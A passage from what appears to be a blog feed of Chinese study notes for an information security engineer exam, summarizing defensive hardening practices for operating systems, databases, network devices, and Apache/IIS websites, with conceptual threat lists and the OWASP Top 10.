href="#Apache-Web安全增强" class="headerlink" title="Apache Web安全增强"></a>Apache Web安全增强</h2><p>措施：</p><ol><li><p>及时安装Apache Web补丁</p></li><li><p>启用.htaccess文件保护网页</p></li><li><p>为Apache Web服务软件设置专门的用户和组</p></li><li><p>隐藏Apache Web软件的版本号</p></li><li><p>Apache Web目录访问安全增强</p><ul><li>设定禁止使用目录索引文件</li><li>禁止默认访问</li><li>禁止用户重载</li></ul></li><li><p>Apache Web文件目录保护</p><p>最佳安全实践：</p><ul><li>ServerRoot保存配置文件（conf子目录）、二进制文件和其他服务器配置文件</li><li>DocumentRoot保存Web站点的内容，包括HTML文件和图片等</li><li>Apache服务CGI目录的属主和权限设置555</li><li>Apache服务器执行目录的属主和权限设置550</li><li>Apache服务器日志目录的属主和权限设置664</li></ul><p>详细命令见P482</p></li><li><p>删除Apache Web默认目录或不必要的文件</p><p>需要删除的文件：</p><ul><li>Apache源代码文件</li><li>默认HTML文件</li><li>CGI程序样例</li><li>默认用户文件</li></ul></li><li><p>使用第三方软件安全增强Apache Web服务</p><ul><li>构建Apache Web服务器“安全沙箱”</li><li>使用OpenSSL增强Apache Web安全通信</li><li>增强Apache Web服务器访问控制</li></ul></li></ol><h1 id="IIS安全分析与增强"><a href="#IIS安全分析与增强" class="headerlink" title="IIS安全分析与增强"></a>IIS安全分析与增强</h1><h2 id="IIS概述"><a href="#IIS概述" class="headerlink" title="IIS概述"></a>IIS概述</h2><p>IIS处理HTTP请求的步骤：</p><ol><li>HTTP.sys接收到客户的HTTP请求</li><li>HTTP.sys联系WAS（Windows Process Activation Service），从配置库中获取信息</li><li>WAS从配置库applicationHost.config中请求配置信息</li><li>WWW Service接收配置信息，例如应用池和站点配置</li><li>WWW Service使用这些配置信息设置HTTP.sys</li><li>WAS针对请求，为应用池启动工作进程</li><li>工作进程处理请求和返回HTTP.sys的响应</li><li>客户接收到响应</li></ol><h2 id="IIS安全分析"><a href="#IIS安全分析" class="headerlink" title="IIS安全分析"></a>IIS安全分析</h2><p>典型威胁：</p><ul><li>非授权访问</li><li>网络蠕虫</li><li>网页篡改</li><li>拒绝服务</li><li>IIS软件漏洞</li></ul><h2 id="IIS安全机制"><a href="#IIS安全机制" class="headerlink" title="IIS安全机制"></a>IIS安全机制</h2><ol><li><p>IIS认证机制</p><p>认证方式：</p><ul><li>匿名认证</li><li>基本验证</li><li>证书认证</li><li>数字签名认证</li><li>IIS证书认证</li><li>Windows认证</li></ul></li><li><p>IIS访问控制</p><p>访问控制措施：请求过滤、URL授权控制、IP地址限制、文件授权</p><p>IIS访问控制流程：</p><p><img src="/2020/09/28/%E7%AC%AC22%E7%AB%A0-%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/IIS访问控制流程.jpg" style="zoom:50%;"></p></li><li><p>IIS日志审计</p></li></ol><h2 id="IIS安全增强"><a href="#IIS安全增强" class="headerlink" title="IIS安全增强"></a>IIS安全增强</h2><p>IIS安全增强措施：</p><ol><li>及时安装IIS补丁</li><li>启用动态IP限制</li><li>启用URLScan</li><li>启用IIS Web应用防火墙</li><li>启用SSL服务</li></ol><h1 id="Web应用漏洞分析与防护"><a href="#Web应用漏洞分析与防护" class="headerlink" title="Web应用漏洞分析与防护"></a>Web应用漏洞分析与防护</h1><h2 id="OWASP-Top-10"><a href="#OWASP-Top-10" class="headerlink" title="OWASP Top 10"></a>OWASP Top 10</h2><ol><li>A1-注入漏洞</li><li>A2-遭受破坏的认证</li><li>A3-敏感数据暴露漏洞</li><li>A4-XML外部实体引用漏洞</li><li>A5-受损害的访问控制漏洞</li><li>A6-安全配置错误</li><li>A7-跨站脚本漏洞</li><li>A8-非安全反序列化漏洞</li><li>A9-使用含有已知漏洞的组件</li><li>A10-非充分的日志记录和监控</li></ol><h2 id="Web应用漏洞防护"><a href="#Web应用漏洞防护" class="headerlink" title="Web应用漏洞防护"></a>Web应用漏洞防护</h2><ol><li><p>SQL注入漏洞分析与防护</p><ul><li>对应用程序输入进行安全过滤</li><li>设置应用程序最小化权限</li><li>屏蔽应用程序错误提示信息</li><li>对开源Web应用程序做安全适应性改造</li></ul></li><li><p>文件上传漏洞分析与防护</p><p>防护措施：</p><ul><li>将上传目录设置为不可执行，避免上传文件远程触发执行</li><li>检查上传文件的安全性，阻断恶意文件上传</li></ul></li><li><p>跨站脚本攻击</p><p>典型的攻击方式：</p><ul><li>HTML内容替换</li><li>嵌入脚本内容</li><li>强制网页加载外部脚本</li></ul></li></ol><h1 id="网站安全保护机制与技术方案"><a href="#网站安全保护机制与技术方案" class="headerlink" title="网站安全保护机制与技术方案"></a>网站安全保护机制与技术方案</h1><h2 id="网站安全保护机制"><a href="#网站安全保护机制" class="headerlink" title="网站安全保护机制"></a>网站安全保护机制</h2><ol><li>身份鉴别：用户名/口令、U盾、人脸识别以及基于证书的统一用户身份管理</li><li>访问控制</li><li>网站内容安全：网站文字内容安全检查、网页防篡改、敏感词汇过滤</li><li>网站数据安全：用户数据隔离、数据加密、SSL、数据备份以及隐私保护</li><li>网站安全防护</li><li>网站安全审计与监控</li><li>网站应急响应：网页防篡改、网站域名服务灾备、网络流量清洗、灾备中心、网络攻击取证</li><li>网站合规管理：网站备案、网站防伪标识、网站等保测评</li><li>网站安全测评：漏洞扫描、渗透测试、代码审核、风险分析</li><li>网站安全管理机制：网站安全保障工作的总体方针和安全策略，建立网站建设、网站运维、网站内容、网站域名、网站应急预案等方面的安全管理制度</li></ol><h2 id="网站构成组件安全加固"><a href="#网站构成组件安全加固" class="headerlink" title="网站构成组件安全加固"></a>网站构成组件安全加固</h2><p>安全加固方面：</p><ul><li>操作系统安全加固</li><li>数据库系统安全加固</li><li>Web服务器软件安全加固</li><li>Web应用程序安全加固</li><li>Web通信安全加固</li><li>网站域名服务安全加固</li><li>网站后台管理安全加固</li></ul><h2 id="网站攻击防护及安全监测"><a href="#网站攻击防护及安全监测" class="headerlink" title="网站攻击防护及安全监测"></a>网站攻击防护及安全监测</h2><ol><li><p>防火墙</p></li><li><p>漏洞扫描</p></li><li><p>网站防篡改</p><p>实现技术：</p><ul><li>利用操作系统的文件调用事件来检测网页文件的完整性变化</li><li>利用密码学的单向函数检测</li></ul></li><li><p>网络流量清洗</p></li><li><p>网站安全监测</p><p>主要内容：</p><ul><li>网站安全漏洞监测</li><li>网站挂马监测</li><li>网站ICP备案监测</li><li>网站合规性监测</li><li>网站性能监测</li><li>网站DNS监测</li><li>网站入侵检测</li></ul></li></ol><h1 id="网站安全综合应用案例分析"><a href="#网站安全综合应用案例分析" class="headerlink" title="网站安全综合应用案例分析"></a>网站安全综合应用案例分析</h1><p>政务网站安全保护、网上银行安全保护详见P499-P501</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;网站安全威胁与需求分析&quot;&gt;&lt;a href=&quot;#网站安全威胁与需求分析&quot; class=&quot;headerlink&quot; title=&quot;网站安全威胁与需求分析&quot;&gt;&lt;/a&gt;网站安全威胁与需求分析&lt;/h1&gt;&lt;p&gt;网站安全主要是：机密性、完整性、可用性及可控性&lt;/p&gt;
&lt;h2 id=&quot;网站安全分析&quot;&gt;&lt;a href=&quot;#网站安全分析&quot; class=&quot;headerlink&quot; title=&quot;网站安全分析&quot;&gt;&lt;/a&gt;网站安全分析&lt;/h2&gt;&lt;p&gt;主要威胁：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;非授权访问&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;网页篡改&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;数据泄露&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;恶意代码&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>第21章 网络设备安全</title>
    <link href="https://fl4g.cn/2020/09/28/%E7%AC%AC21%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8/"/>
    <id>https://fl4g.cn/2020/09/28/%E7%AC%AC21%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8/</id>
    <published>2020-09-28T01:51:14.000Z</published>
    <updated>2020-09-28T04:06:19.265Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络设备安全概况"><a href="#网络设备安全概况" class="headerlink" title="网络设备安全概况"></a>网络设备安全概况</h1><h2 id="交换机安全威胁"><a href="#交换机安全威胁" class="headerlink" title="交换机安全威胁"></a>交换机安全威胁</h2><p>面临威胁：</p><ol><li>MAC地址泛洪</li><li>ARP欺骗</li><li>口令威胁</li><li>漏洞利用</li></ol><a id="more"></a><h2 id="路由器安全威胁"><a href="#路由器安全威胁" class="headerlink" title="路由器安全威胁"></a>路由器安全威胁</h2><p>面临威胁：</p><ol><li>漏洞利用</li><li>口令安全威胁</li><li>路由协议安全威胁</li><li>DoS/DDoS威胁</li><li>依赖性威胁</li></ol><h1 id="网络设备安全机制与实现技术"><a href="#网络设备安全机制与实现技术" class="headerlink" title="网络设备安全机制与实现技术"></a>网络设备安全机制与实现技术</h1><h2 id="认证机制"><a href="#认证机制" class="headerlink" title="认证机制"></a>认证机制</h2><p>交换机、路由器等设置支持：</p><ul><li><p>TACACS+（Terminal Access Controller Access Control System）认证</p><p><img src="/2020/09/28/%E7%AC%AC21%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8/TACACS+.jpg" style="zoom:50%;"></p></li><li><p>RADIUS（Remote Authentication Dial In User Service）认证</p><p><img src="/2020/09/28/%E7%AC%AC21%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8/RADIUS.jpg" style="zoom:50%;"></p></li></ul><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>网络设备等访问分为：带外访问（不依赖网络）和带内访问（需要网络支持）</p><p>访问方法：控制端口（Console Port）、辅助端口（AUX port）、VTY、HTTP、TFTP、SNMP</p><ol><li><p>Con端口访问：限制特定主机访问路由器</p></li><li><p>VTY访问控制：指定固定IP地址，并增加时间约束</p></li><li><p>HTTP访问控制：限制指定IP地址</p></li><li><p>SNMP访问控制</p></li><li><p>设置管理专网</p><p>具体方法：</p><ul><li>将管理主机和路由器之间的全部通信进行加密，使用SSH替换Telnet</li><li>在路由器设置包过滤规则，只运行管理主机远程访问路由器</li></ul></li><li><p>特权分级</p></li></ol><p><strong>以上配置命令见P453-P456</strong></p><h2 id="信息加密"><a href="#信息加密" class="headerlink" title="信息加密"></a>信息加密</h2><p>启用service password-encryption配置</p><h2 id="安全通信"><a href="#安全通信" class="headerlink" title="安全通信"></a>安全通信</h2><p>两种方式：</p><ol><li><p>SSH</p><p>配置步骤</p><p>（1）使用hostname指定设备名称</p><p>（2）使用ip domain-name配置设备域</p><p>（3）使用crypto key generate rsa生成RSA加密密钥。最小1024位</p><p>（4）使用ip ssh设置SSH访问</p><p>（5）使用transport input命令配置使用SSH，见P457</p></li><li><p>IPSec VPN</p><p><img src="/2020/09/28/%E7%AC%AC21%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8/IPsec配置过程.jpg" style="zoom:50%;"></p><h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2></li></ol><p>网络设备提供控制台日志审计、缓冲区日志审计、终端审计、SNMP traps、AAA审计、Syslog审计</p><h2 id="安全增强"><a href="#安全增强" class="headerlink" title="安全增强"></a>安全增强</h2><ol><li><p>关闭非安全的网络服务及功能</p></li><li><p>信息过滤：命令见P459</p></li><li><p>协议认证</p><p>安全措施：</p><ul><li>启用OSPF路由协议的认证：命令见P460</li><li>RIP协议的认证：命令见P460</li><li>启用IP Unicast Reverse-Path Verification：命令见P461</li></ul></li></ol><h2 id="物理安全"><a href="#物理安全" class="headerlink" title="物理安全"></a>物理安全</h2><p>策略：</p><ul><li>指定授权人安装、卸载和移动网络设备</li><li>指定授权人进行维护以及改变网络设备的物理设备</li><li>指定授权人进行网络设备的物理连接</li><li>指定授权人进行网络设备的控制台使用以及其他的直接访问端口连接</li><li>明确网络设备受到物理顺坏时的恢复过程或者出现网络设备被篡改配置后的恢复过程</li></ul><h1 id="网络设备安全增强技术方法"><a href="#网络设备安全增强技术方法" class="headerlink" title="网络设备安全增强技术方法"></a>网络设备安全增强技术方法</h1><h2 id="交换机安全增强技术方法"><a href="#交换机安全增强技术方法" class="headerlink" title="交换机安全增强技术方法"></a>交换机安全增强技术方法</h2><ol><li><p>配置交换机访问口令和ACL，限制安全登录</p><p>交换机的安全访问控制分为两级：通过控制用户的连接实现；通过用户口令认证实现</p></li><li><p>利用镜像技术检测网络流量</p></li><li><p>MAC地址控制技术</p><ul><li>设置最多可学习到的MAC地址数</li><li>设置系统MAC地址老化时间</li></ul></li><li><p>安全增强</p><p>主要方法：关闭交换机不必要的网络服务、限制安全远程访问、限制控制台的访问、启动登录安全检查、安全审计</p><p><strong>以思科交换机位例，命令见P463-P465</strong></p></li></ol><h2 id="路由器安全增强技术方法（命令见P466-P469）"><a href="#路由器安全增强技术方法（命令见P466-P469）" class="headerlink" title="路由器安全增强技术方法（命令见P466-P469）"></a>路由器安全增强技术方法（命令见P466-P469）</h2><ol><li><p>及时升级操作系统和打补丁</p></li><li><p>关闭不需要的网络服务</p><p>操作方法</p><ul><li>禁止CDP</li><li>禁止其他的TCP、UDP Small服务</li><li>禁止Finger服务</li><li>禁止HTTP服务</li><li>禁止BOOTP服务</li><li>禁止从网络启动和自动从网络下载初始配置文件</li><li>禁止ARP-Proxy服务</li><li>明确地禁止IP Directed Broadcast</li><li>禁止IP Classless</li><li>禁止ICMP协议的IP Unreachables、Redirects、Mask Replies</li><li>禁止SNMP协议服务</li><li>禁止WINS和DNS服务</li></ul></li><li><p>明确禁止不使用的端口</p></li><li><p>禁止IP直接广播和源路由</p></li><li><p>增强路由器VTY安全</p></li><li><p>阻断恶意数据包</p><p>常见恶意数据包类型：</p><ul><li>源地址声称来自内部网</li><li>loopback数据包</li><li>ICMP重定向</li><li>广播包</li><li>源地址和目标地址相同</li></ul></li><li><p>路由器口令安全</p></li><li><p>传输加密</p></li><li><p>增强路由器SNMP的安全</p></li></ol><h1 id="网络设备常见漏洞与解决方法"><a href="#网络设备常见漏洞与解决方法" class="headerlink" title="网络设备常见漏洞与解决方法"></a>网络设备常见漏洞与解决方法</h1><h2 id="网络设备常见漏洞"><a href="#网络设备常见漏洞" class="headerlink" title="网络设备常见漏洞"></a>网络设备常见漏洞</h2><ol><li>拒绝服务漏洞</li><li>跨站伪造请求CSRF</li><li>格式化字符串漏洞</li><li>XSS</li><li>旁路</li><li>代码执行</li><li>溢出</li><li>内存破坏</li></ol><h2 id="网络设备漏洞解决方法"><a href="#网络设备漏洞解决方法" class="headerlink" title="网络设备漏洞解决方法"></a>网络设备漏洞解决方法</h2><ol><li><p>及时获取网络设备漏洞信息</p></li><li><p>网络设备漏洞扫描：端口扫描工具、通用漏洞扫描器、专用漏洞扫描器</p></li><li><p>网络设备漏洞修补</p><p>处理方法：</p><ul><li>修改配置文件</li><li>安全漏洞利用限制</li><li>服务替换</li><li>软件包升级</li></ul></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;网络设备安全概况&quot;&gt;&lt;a href=&quot;#网络设备安全概况&quot; class=&quot;headerlink&quot; title=&quot;网络设备安全概况&quot;&gt;&lt;/a&gt;网络设备安全概况&lt;/h1&gt;&lt;h2 id=&quot;交换机安全威胁&quot;&gt;&lt;a href=&quot;#交换机安全威胁&quot; class=&quot;headerlink&quot; title=&quot;交换机安全威胁&quot;&gt;&lt;/a&gt;交换机安全威胁&lt;/h2&gt;&lt;p&gt;面临威胁：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;MAC地址泛洪&lt;/li&gt;
&lt;li&gt;ARP欺骗&lt;/li&gt;
&lt;li&gt;口令威胁&lt;/li&gt;
&lt;li&gt;漏洞利用&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>第20章 数据库系统安全</title>
    <link href="https://fl4g.cn/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    <id>https://fl4g.cn/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/</id>
    <published>2020-09-27T07:10:24.000Z</published>
    <updated>2020-09-27T09:28:54.620Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库安全概况"><a href="#数据库安全概况" class="headerlink" title="数据库安全概况"></a>数据库安全概况</h1><h2 id="数据库安全威胁"><a href="#数据库安全威胁" class="headerlink" title="数据库安全威胁"></a>数据库安全威胁</h2><ol><li>授权的误用</li><li>逻辑推断和汇聚：不敏感数据汇聚推断出敏感数据</li><li>伪装</li><li>旁路控制</li><li>隐蔽信道</li><li>SQL注入攻击</li><li>数据库口令密码破解</li><li>硬件及介质攻击</li></ol><a id="more"></a><h2 id="数据库安全隐患"><a href="#数据库安全隐患" class="headerlink" title="数据库安全隐患"></a>数据库安全隐患</h2><ol><li>数据库用户账号和密码隐患</li><li>数据库系统扩展存储过程隐患</li><li>数据库系统软件和应用程序漏洞</li><li>数据库系统权限分配隐患</li><li>数据库系统用户安全意识薄弱</li><li>网络通信内容是明文传递</li><li>数据库系统安全机制不健全</li></ol><h2 id="数据库安全需求"><a href="#数据库安全需求" class="headerlink" title="数据库安全需求"></a>数据库安全需求</h2><ol><li>数据库标识与鉴别</li><li>数据库访问控制</li><li>数据库安全审计</li><li>数据库备份与恢复</li><li>数据库加密</li><li>资源限制</li><li>数据库安全加固</li><li>数据库安全管理</li></ol><h1 id="数据库安全机制与实现技术"><a href="#数据库安全机制与实现技术" class="headerlink" title="数据库安全机制与实现技术"></a>数据库安全机制与实现技术</h1><h2 id="数据库安全机制"><a href="#数据库安全机制" class="headerlink" title="数据库安全机制"></a>数据库安全机制</h2><p><img src="/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/安全机制.jpg" style="zoom:50%;"></p><h2 id="数据库加密"><a href="#数据库加密" class="headerlink" title="数据库加密"></a>数据库加密</h2><p>加密方式：</p><ul><li>数据库网上传输的数据，通常利用SSL协议来实现</li><li>数据库存储的数据，通过数据库存储加密来实现</li></ul><p>数据库存储加密方式：库内加密和库外加密</p><p>常用技术：基于文件的数据库加密技术、基于记录的数据库机密技术、基于字段的数据库文件进行加密</p><h2 id="数据库防火墙"><a href="#数据库防火墙" class="headerlink" title="数据库防火墙"></a>数据库防火墙</h2><p>安全作用：</p><ul><li>屏蔽直接访问数据库的通道</li><li>增强认证</li><li>攻击检测</li><li>防止漏洞利用</li><li>防止内部高危操作</li><li>防止敏感数据泄露</li><li>数据库安全审计</li></ul><h2 id="数据库脱敏"><a href="#数据库脱敏" class="headerlink" title="数据库脱敏"></a>数据库脱敏</h2><p>常见技术方法：屏蔽、变形、替换、随机、加密</p><h1 id="Oracle数据库安全分析与防护"><a href="#Oracle数据库安全分析与防护" class="headerlink" title="Oracle数据库安全分析与防护"></a>Oracle数据库安全分析与防护</h1><h2 id="Oracle数据库安全分析"><a href="#Oracle数据库安全分析" class="headerlink" title="Oracle数据库安全分析"></a>Oracle数据库安全分析</h2><p>安全机制和技术：用户认证、访问控制（网络和数据对象授权控制）、特权管理、安全审计和数据库防火墙、透明加密</p><h2 id="Oracle数据库安全最佳实践"><a href="#Oracle数据库安全最佳实践" class="headerlink" title="Oracle数据库安全最佳实践"></a>Oracle数据库安全最佳实践</h2><ol><li>增强Oracle数据库服务器的操作系统安全</li><li>最小化安装Oracle，删除不必要组件</li><li>安装最新的安全补丁</li><li>删除或修改默认的用户名和密码</li><li>启用认证机制</li><li>设置好的口令密码策略</li><li>设置最小化权限<ul><li>UTL_FILE：读取服务器上文件</li><li>UTL_HTTP：通过HTTP访问外部资源</li><li>UTL_TCP：通过TCP建立连接，从网络得到可执行文件</li><li>UTL_SMTP：通过SMTP转发关键文件</li></ul></li><li>限制连接Oracle的IP地址</li><li>传输加密</li><li>启用Oracle审计</li><li>定期查看Oracle漏洞发布信息</li><li>实施Oracle灾备计划</li></ol><h1 id="MS-SQL数据库安全分析与防护"><a href="#MS-SQL数据库安全分析与防护" class="headerlink" title="MS SQL数据库安全分析与防护"></a>MS SQL数据库安全分析与防护</h1><h2 id="MS-SQL安全分析"><a href="#MS-SQL安全分析" class="headerlink" title="MS SQL安全分析"></a>MS SQL安全分析</h2><p>安全机制：</p><ol><li><p>用户身份认证</p></li><li><p>访问控制：基于角色的访问控制</p></li><li><p>数据库加密</p><p><img src="/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/MSSQL透明加密.jpg" style="zoom:50%;"></p></li><li><p>备份、恢复机制</p></li><li><p>安全审计</p></li></ol><h2 id="MS-SQL-Server安全最佳实践"><a href="#MS-SQL-Server安全最佳实践" class="headerlink" title="MS SQL Server安全最佳实践"></a>MS SQL Server安全最佳实践</h2><ol><li>设置好的数据库密码安全策略</li><li>加强扩展存储过程管理，删除不必要存储过程</li><li>网上数据加密传输</li><li>修改数据库默认的TCP/IP端口号</li><li>对SQL数据库访问的网络连接进行IP限制</li><li>启用SQL Server日志审计，记录所有的用户访问和分析安全事件日志</li><li>定期查看MS SQL Server漏洞发布信息，及时修补漏洞</li><li>保证MS SQL Server的操作系统安全</li><li>MS SQL Server安全检测，制定安全容灾备份计划</li></ol><h1 id="MySQL数据库安全分析与防护"><a href="#MySQL数据库安全分析与防护" class="headerlink" title="MySQL数据库安全分析与防护"></a>MySQL数据库安全分析与防护</h1><h2 id="MySQL安全分析"><a href="#MySQL安全分析" class="headerlink" title="MySQL安全分析"></a>MySQL安全分析</h2><p>安全机制包括：</p><ul><li>用户身份认证</li><li>访问授权：user、db、host、tables_priv和columns_priv5个授权表</li><li>安全审计</li></ul><h2 id="MySQL安全最佳实践"><a href="#MySQL安全最佳实践" class="headerlink" title="MySQL安全最佳实践"></a>MySQL安全最佳实践</h2><ol><li>MySQL安装</li><li>建立MySQL Chrooting运行环境</li><li>关闭MySQL的远程连接</li><li>禁止MySQL导入本地文件</li><li>修改MySQL的root用户ID和密码</li><li>删除MySQL的默认用户和db</li><li>更改MySQL的root用户吗，防止口令暴力破解</li><li>建立应用程序独立使用数据库的用户账号</li><li>安全检测</li><li>安全备份</li></ol><h1 id="国产数据库安全分析与防护"><a href="#国产数据库安全分析与防护" class="headerlink" title="国产数据库安全分析与防护"></a>国产数据库安全分析与防护</h1><h2 id="国产数据库安全分析"><a href="#国产数据库安全分析" class="headerlink" title="国产数据库安全分析"></a>国产数据库安全分析</h2><ol><li>国产数据库安全漏洞</li><li>国产数据库依赖第三方系统组件的安全</li><li>国产数据库系统安全配置的安全</li><li>国产数据库支持平台的安全</li></ol><h2 id="国产数据库安全增强措施"><a href="#国产数据库安全增强措施" class="headerlink" title="国产数据库安全增强措施"></a>国产数据库安全增强措施</h2><ol><li>国产数据库安全漏洞挖掘及扫描</li><li>国产数据库加密</li><li>国产安全数据库</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;数据库安全概况&quot;&gt;&lt;a href=&quot;#数据库安全概况&quot; class=&quot;headerlink&quot; title=&quot;数据库安全概况&quot;&gt;&lt;/a&gt;数据库安全概况&lt;/h1&gt;&lt;h2 id=&quot;数据库安全威胁&quot;&gt;&lt;a href=&quot;#数据库安全威胁&quot; class=&quot;headerlink&quot; title=&quot;数据库安全威胁&quot;&gt;&lt;/a&gt;数据库安全威胁&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;授权的误用&lt;/li&gt;
&lt;li&gt;逻辑推断和汇聚：不敏感数据汇聚推断出敏感数据&lt;/li&gt;
&lt;li&gt;伪装&lt;/li&gt;
&lt;li&gt;旁路控制&lt;/li&gt;
&lt;li&gt;隐蔽信道&lt;/li&gt;
&lt;li&gt;SQL注入攻击&lt;/li&gt;
&lt;li&gt;数据库口令密码破解&lt;/li&gt;
&lt;li&gt;硬件及介质攻击&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
    <category term="学习笔记" scheme="https://fl4g.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>第19章 操作系统安全防护</title>
    <link href="https://fl4g.cn/2020/09/25/%E7%AC%AC19%E7%AB%A0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/"/>
    <id>https://fl4g.cn/2020/09/25/%E7%AC%AC19%E7%AB%A0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/</id>
    <published>2020-09-25T08:43:19.000Z</published>
    <updated>2020-09-27T04:24:28.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统安全概述"><a href="#操作系统安全概述" class="headerlink" title="操作系统安全概述"></a>操作系统安全概述</h1><p>操作系统的安全可控目标分为两个层面：</p><ol><li>给定一个操作系统，用户能够实现对操作系统的可理解、可修改、可检测、可修复、可保护</li><li>商业用户能够自己主导操作系统的产品化，不受恶意的商业利益绑架或遭受知识产权专利陷阱，操作系统不能被利用危及国家安全</li></ol><a id="more"></a><h2 id="操作系统安全需求"><a href="#操作系统安全需求" class="headerlink" title="操作系统安全需求"></a>操作系统安全需求</h2><p>主要包括：</p><ol><li>标识和鉴别</li><li>访问控制</li><li>系统资源安全</li><li>网络安全</li><li>抗攻击</li><li>自身安全</li></ol><h2 id="操作系统安全机制"><a href="#操作系统安全机制" class="headerlink" title="操作系统安全机制"></a>操作系统安全机制</h2><p>主要包括：硬件安全、标识与鉴别、访问控制、最小特权管理、可信路径、安全审计、系统安全增强</p><h2 id="操作系统安全技术"><a href="#操作系统安全技术" class="headerlink" title="操作系统安全技术"></a>操作系统安全技术</h2><p>包括：硬件容灾备份技术、可信计算技术、身份认证技术、访问控制技术、加密技术、安全审计和监测技术、系统安全增强技术、特权管理技术、形式化分析技术、安全渗透技术、隐蔽信道分析、安全补丁、防火墙、入侵检测、安全沙箱、攻击欺骗、地址空间随机化和系统恢复等技术</p><h1 id="Windows操作系统安全分析与防护"><a href="#Windows操作系统安全分析与防护" class="headerlink" title="Windows操作系统安全分析与防护"></a>Windows操作系统安全分析与防护</h1><h2 id="Windows系统架构"><a href="#Windows系统架构" class="headerlink" title="Windows系统架构"></a>Windows系统架构</h2><p>Windows XP架构，分为三层：</p><ul><li>最底层是硬件抽象层，为上层提供硬件结构的接口，方便移植</li><li>第二层是内核层，为底层提供执行、中断、异常处理和同步的支持</li><li>第三层由一系列实现基本系统服务的模块组成，如虚拟内存管理、I/O管理</li></ul><p>Windows 2000系统有专门的安全子系统，组成：</p><ul><li>本地安全授权（LSA）：产生令牌、执行本地安全管理、提供交互式登录认证服务、控制安全审查策略和由SRM产生的审查记录信息</li><li>安全账户管理（SAM）：对SAM数据库进行维护，该数据库包含所有组和用户信息。</li><li>安全参考监视器（SRM）：负责访问控制和审查策略，由LSA支持。</li></ul><h2 id="Windows安全机制"><a href="#Windows安全机制" class="headerlink" title="Windows安全机制"></a>Windows安全机制</h2><ol><li><p>Windows认证机制</p><p>Windows2000提供两种基本认证类型：本地认证和网络认证</p><p>Windows2000安全系统集成三种身份验证技术：Kerberos V5、公钥证书和NTLM</p></li><li><p>Windows访问控制机制</p><p>安全性描述符组成：用户SID（Owner）、工作组SID（Group）、自由访问控制列表（ACL）和系统访问控制列表（SACL）</p></li><li><p>Windows审计/日志机制</p><p>日志有三种类型：系统日志、应用程序日志和安全日志，目录为“system32\config”</p></li><li><p>Windows协议过滤和防火墙</p></li><li><p>Windows文件加密系统</p></li><li><p>抗攻击机制</p><p>Windows7、10内存保护机制：堆栈保护、安全结构例外处理SafeSEH、数据执行保护DEP、地址随机化ASLR、补丁保护PatchGuard、驱动程序签名</p><p><strong>Windows10提供减少攻击面规则配置-详见P401</strong></p></li></ol><h2 